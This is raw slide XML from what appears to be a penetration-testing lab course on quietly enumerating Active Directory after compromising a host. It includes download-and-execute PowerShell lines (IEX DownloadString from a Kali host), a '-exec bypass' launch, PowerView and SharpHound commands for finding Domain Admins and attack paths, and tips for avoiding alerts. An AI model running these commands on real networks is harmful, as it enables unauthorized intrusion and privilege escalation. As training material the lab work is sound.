                        <a:t>Directory (users, groups)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408125"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="514020">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Files + machines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304414"/>
                  </a:ext>
                </a:extLst>
              </a:tr>
              <a:tr h="514020">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:r>
                        <a:rPr lang="en-US" dirty="0"/>
                        <a:t>Services + system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8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50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9550"/>
            <a:ext cx="11353800" cy="596741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solidFill>
                  <a:srgbClr val="00B050"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Structure</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="0070C0"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>:-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Forest (top level)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├── Domain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│ ├── Users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│ ├── Groups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│ ├── Computers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│ └── OUs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This task trains you to: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 the domain as a graph, not a network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Where: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Nodes = Users, Groups, Machines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Edges = Permissions, Trust, Access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86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dirty="0"/>
              <a:t>                                         Task 02</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="2261992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70" y="365125"/>
            <a:ext cx="11179629" cy="1325563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Task 02: AD Enumeration (The "Quiet" Way)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098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Query the Domain Controller to find users, groups, and computers without triggering alerts.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Technical Requirements</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: 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PowerView</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Use Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>NetUser</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>NetComputer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, and Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>NetGroup</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> to list domain assets. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0" err="1"/>
              <a:t>BloodHound</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Run SharpHound.exe to collect AD data and import it into the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>BloodHound</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> GUI (Kali) to visualize attack paths (e.g., finding which user has Admin rights on which machine). </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>LDAP Search</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Use </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ldapsearch</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> or </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ADExplorer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> to browse the directory tree manually.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Learning Goal</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: Identifying the "High-Value Targets" (Domain Admins) and the paths to reach them. </a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3793338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TASK 02 — AD ENUMERATION (“THE QUIET WAY”)</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" b="1" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>🎯 What “quiet” actually means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It’s not magic stealth.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>It means:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Use legitimate domain queries instead of noisy scanning</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>So instead of:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Port scans, exploits, brute force</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>You do:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>Ask the domain what it already knows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WHERE YOU ARE STANDING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normal domain user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that’s enough.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Because AD is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>designed to be readable</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p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59590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WHAT YOU’RE TRYING TO EXTRACT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Before tools, define your targets:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="457200" lvl="1" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>✔ Users</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>✔ Groups</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>✔ Computers</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>✔ Privileged relationships</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>But more importantly:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>WHO → has power</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>WHERE → they can log in</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>HOW → you can reach them</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>🔍 PART 1 — ENUMERATION APPROACHES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1.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PowerView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(Structured Querying(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>disciplined, filter-based)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Before going in practical </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" dirty="0"/>
              <a:t>You </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1700" b="1" dirty="0"/>
              <a:t>transition into PowerShell inside that compromised machine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/>
              <a:t>PowerShell → AD Enumeration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meterpreter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get access → open PowerShell → run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PowerView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✔ You </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>start from </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1"/>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>❌ You </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>don’t run them inside </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0" err="1"/>
              <a:t>meterpreter</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t> directly</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>✔ You </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>spawn PowerShell inside the compromised machine and run them there</a:t>
            </a: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Spawn</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="17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means </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>launching a PowerShell process from your current shell (like Meterpreter)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033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21770"/>
            <a:ext cx="12453257" cy="6836229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You land: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Pre-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requisistes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:- Import-Module works only if the PowerView.ps1 file is already present on the target at that path.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If you haven't uploaded the file, you must use the IEX download method instead.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Best practice for a real engagement: Upload the script first (via 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meterpreter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upload) to a writeable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location (e.g., C:\Windows\Temp\) to avoid downloading over the network (which might trigger alerts).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Then Import-Module.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meterpreter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session (Windows host)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At this point you only have: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Access to a machine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NOT access to the domain (yet, conceptually)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/>
              <a:t>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STEP-BY-STEP (REAL LAB FLOW)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/>
              <a:t>spawn PowerShell inside the compromised machine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 From Meterpreter → spawn PowerShell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Inside your session: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meterpreter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shell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PS C:\&gt; </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Menlo"/>
              </a:rPr>
              <a:t> -exec bypass</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0"/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Now you are in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" b="1" dirty="0"/>
              <a:t>PowerShell</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>. Then import </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0" err="1"/>
              <a:t>PowerView</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="1800" dirty="0"/>
              <a:t>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PS C:\&gt; Import-Module C:\Windows\Temp\PowerView.ps1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent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Or if you download it via IEX:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent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PS C:\&gt; IEX (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>('http://&lt;kali-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>&gt;/PowerView.ps1')</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent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Now you are in a PowerShell environment on the target.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Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>NetUser</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> | select </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>samaccountname</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>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Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>NetComputer</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>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Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>NetGroup</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> -</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>GroupName</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t> "Domain Admins"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sp>
        <p:nvSpPr>
          <p:cNvPr id="430" name="Rectangle 425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C:\&gt;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574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Now you’re in cmd. From there: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 err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>powershell</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0">
              <a:solidFill>
                <a:srgbClr val="7030A0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Now you’re in a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>real PowerShell environment</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> on the target</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1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2. Load </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>PowerView</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> (IMPORTANT)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Those functions don’t exist yet.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You need to load </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>PowerView</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="17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/>
              <a:t>Option A – Download from Kali HTTP server (if target has internet access):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IEX (New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>Net.WebClient</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>).</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>('http://&lt;your-kali-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>&gt;/PowerView.ps1')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This loads the functions </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>in memory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Or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$web = New-Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Net.WebClient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$script = $</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>web.DownloadString</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>('http://&lt;kali-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>&gt;/PowerView.ps1')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IEX $script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Or upload the file first and import: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 err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Powershell</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="1700" b="1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Import-Module .\PowerView.ps1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Or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 C:\Windows\Temp\PowerView.ps1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3. NOW run the commands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👤 Users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Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>NetUser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💻 Computers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Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="1700" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>NetComputer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409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/>
              <a:t>👥 Groups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Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>NetGroup</a:t>
            </a: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🎯</a:t>
            </a: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Domain Admins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Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>NetGroup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-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>GroupName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"Domain Admins"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🎯</a:t>
            </a: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Members of Domain Admins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Get-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>NetGroupMember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-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>GroupName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"Domain Admins"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🎯</a:t>
            </a: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Find admin access on machines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Find-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" err="1">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>LocalAdminAccess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/>
              <a:t>WHEN THIS WILL WORK</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>✔ Target machine is </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>domain-joined</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>✔ Your user = </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>domain user</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>✔ Network can reach Domain Controller</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>❌ WHEN THIS WILL FAIL</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>❌ Workgroup machine</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>❌ Local user only</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>❌ No DC connectivity</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Part 2</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="1" dirty="0" err="1"/>
              <a:t>BloodHound</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t>: Run SharpHound.exe to collect AD data and import it into the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0" err="1"/>
              <a:t>BloodHound</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" dirty="0"/>
              <a:t> GUI (Kali) to visualize attack paths (e.g., finding which user has Admin rights on which machine).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WHAT THIS PART REALLY MEANS</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>“Run </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>SharpHound</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> → import into </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>BloodHound</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>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 it mentally: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Collect AD relationships → visualize them as attack paths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WHAT </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>BloodHound</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> DOES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lists like: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 A is admin on Machine B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 B is in Domain Admins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You see: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 A → Machine B → User B → Domain Admin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👉 That’s the power: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⚙️ HOW THE FLOW WORKS (BIG PICTURE)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143" y="4057259"/>
            <a:ext cx="3955147" cy="2800741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20700230">
            <a:off x="3869804" y="6010972"/>
            <a:ext cx="2494342" cy="5334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44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 STEP-BY-STEP (LAB FLOW)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You already have access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on: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Domain-joined machine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>
                <a:latin typeface="Arial Unicode MS"/>
              </a:rPr>
              <a:t>(as domain user)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2. Run </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>SharpHound</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t> (DATA COLLECTION)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Transfer the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1"/>
              <a:t>sharpound</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t> onto windows 7</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>On Kali (your machine):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python3 -m </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>http.server</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="7030A0"/>
                </a:solidFill>
              </a:rPr>
              <a:t> 8000</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Get </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>SharpHound</a:t>
            </a:r>
            <a:r>
